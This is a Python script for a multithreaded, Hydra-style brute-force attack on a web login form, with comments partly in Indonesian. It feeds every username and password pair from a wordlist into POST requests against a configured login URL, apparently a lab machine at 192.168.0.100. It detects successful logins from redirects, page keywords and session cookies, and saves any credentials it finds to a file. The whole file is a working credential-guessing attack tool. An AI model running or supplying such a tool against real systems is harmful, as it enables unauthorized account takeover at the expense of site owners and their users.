import requests
import sys
from threading import Thread, Lock
from queue import Queue
import time

class BruteForcer:
    def __init__(self, target_url, username_list, password_list, max_threads=5):
        self.target_url = target_url
        self.username_list = username_list
        self.password_list = password_list
        self.max_threads = max_threads
        self.found = False
        self.lock = Lock()
        self.queue = Queue()
        self.attempt_count = 0
        
        # Custom headers dengan Hydra User-Agent
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Hydra)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive'
        }
        
    def load_credentials(self):
        """Load username and password combinations"""
        try:
            with open(self.username_list, 'r', encoding='utf-8', errors='ignore') as user_file:
                usernames = [line.strip() for line in user_file if line.strip()]
            
            with open(self.password_list, 'r', encoding='utf-8', errors='ignore') as pass_file:
                passwords = [line.strip() for line in pass_file if line.strip()]
            
            for username in usernames:
                for password in passwords:
                    self.queue.put((username, password))
                    
            print(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
            print(f"[+] Total combinations: {self.queue.qsize()}")
            print(f"[+] Using User-Agent: {self.headers['User-Agent']}")
            
        except FileNotFoundError as e:
            print(f"[-] Error: File not found - {e}")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error loading files: {e}")
            sys.exit(1)
    
    def attempt_login(self, username, password):
        """Attempt login with given credentials"""
        try:
            # Data payload untuk POST request
            payload = {
                'username': username,
                'password': password,
                'submit': 'Login'  # Kadang butuh field submit
            }
            
            # Session untuk maintain cookies dengan headers custom
            with requests.Session() as session:
                session.headers.update(self.headers)
                
                response = session.post(
                    self.target_url,
                    data=payload,
                    timeout=10,
                    allow_redirects=True,  # Biarkan redirect untuk tracking
                    verify=False  # Skip SSL verification untuk testing
                )
                
                # Update attempt counter
                with self.lock:
                    self.attempt_count += 1
                
                # Cek tanda-tanda login berhasil
                if self.check_success(response, username, password):
                    with self.lock:
                        self.found = True
                    return True
                    
        except requests.exceptions.RequestException as e:
            print(f"[-] Request error for {username}:{password} - {e}")
            
        return False
    
    def check_success(self, response, username, password):
        """Detect successful login based on response"""
        # Method 1: Cek berdasarkan URL redirect
        if response.history:  # Jika ada redirect
            final_url = response.url.lower()
            if 'dashboard' in final_url or 'admin' in final_url or 'welcome' in final_url:
                self.print_success(username, password, response, "Redirect to dashboard")
                return True
            if 'login' not in final_url and response.status_code == 200:
                self.print_success(username, password, response, "Successful redirect")
                return True
        
        # Method 2: Cek berdasarkan content analysis
        response_text = response.text.lower()
        
        # Indicators of FAILURE (jadi kita exclude)
        failure_indicators = [
            'invalid', 'incorrect', 'error', 'failed', 'wrong', 
            'try again', 'login failed', 'access denied'
        ]
        
        # Indicators of SUCCESS
        success_indicators = [
            'welcome', 'dashboard', 'logout', 'success', 'admin panel',
            'my account', 'you are logged in', 'member area'
        ]
        
        # Jika ada success indicators DAN tidak ada failure indicators
        has_success = any(indicator in response_text for indicator in success_indicators)
        has_failure = any(indicator in response_text for indicator in failure_indicators)
        
        if has_success and not has_failure:
            self.print_success(username, password, response, "Success indicators found")
            return True
            
        # Method 3: Cek berdasarkan perubahan session/cookies
        if len(response.cookies) > 0:
            cookie_names = [cookie.name.lower() for cookie in response.cookies]
            if any(name in ['session', 'auth', 'token', 'loggedin'] for name in cookie_names):
                self.print_success(username, password, response, "Session cookie set")
                return True
        
        return False
    
    def print_success(self, username, password, response, reason):
        """Print success message dengan detail"""
        print(f"\n{'='*50}")
        print(f"[+] 💥 CREDENTIALS FOUND!")
        print(f"[+] Username: {username}")
        print(f"[+] Password: {password}")
        print(f"[+] Reason: {reason}")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Final URL: {response.url}")
        print(f"[+] Response Length: {len(response.text)}")
        print(f"[+] Cookies: {len(response.cookies)}")
        print(f"[+] Total Attempts: {self.attempt_count}")
        print(f"{'='*50}\n")
        
        # Save to file
        with open('found_credentials.txt', 'w') as f:
            f.write(f"URL: {self.target_url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"User-Agent: {self.headers['User-Agent']}\n")
            f.write(f"Found at: {time.ctime()}\n")
    
    def worker(self):
        """Worker thread untuk proses brute force"""
        while not self.queue.empty() and not self.found:
            username, password = self.queue.get()
            
            if self.found:
                break
                
            print(f"[*] Attempt {self.attempt_count}: {username}:{password} | Queue: {self.queue.qsize()} ", end='\r', flush=True)
            
            if self.attempt_login(username, password):
                break
                
            self.queue.task_done()
    
    def start(self):
        """Start brute force attack"""
        print(f"[*] Starting Hydra-style brute force attack")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Threads: {self.max_threads}")
        print(f"[*] User-Agent: {self.headers['User-Agent']}")
        print("[*] Press Ctrl+C to stop\n")
        
        self.load_credentials()
        
        start_time = time.time()
        threads = []
        
        for i in range(self.max_threads):
            thread = Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # Progress monitoring
            while any(thread.is_alive() for thread in threads) and not self.found:
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print("\n\n[-] Brute force interrupted by user")
            self.found = True
        
        elapsed_time = time.time() - start_time
        
        if not self.found:
            print(f"\n[-] No valid credentials found after {self.attempt_count} attempts")
            print(f"[-] Time elapsed: {elapsed_time:.2f} seconds")
        else:
            print(f"[+] Completed in {elapsed_time:.2f} seconds")

def main():
    # Konfigurasi
    TARGET_URL = "http://192.168.0.100/login.php"
    USERNAME_FILE = "/home/kali/userpass"  # File yang sama untuk user & pass
    PASSWORD_FILE = "/home/kali/userpass"  
    THREADS = 5
    
    # Validasi file
    import os
    if not os.path.exists(USERNAME_FILE):
        print(f"[-] Username file not found: {USERNAME_FILE}")
        return
    
    print("[*] Starting Custom Hydra Brute Forcer...")
    
    # Jalankan brute forcer
    bruteforcer = BruteForcer(TARGET_URL, USERNAME_FILE, PASSWORD_FILE, THREADS)
    bruteforcer.start()

if __name__ == "__main__":
    main()
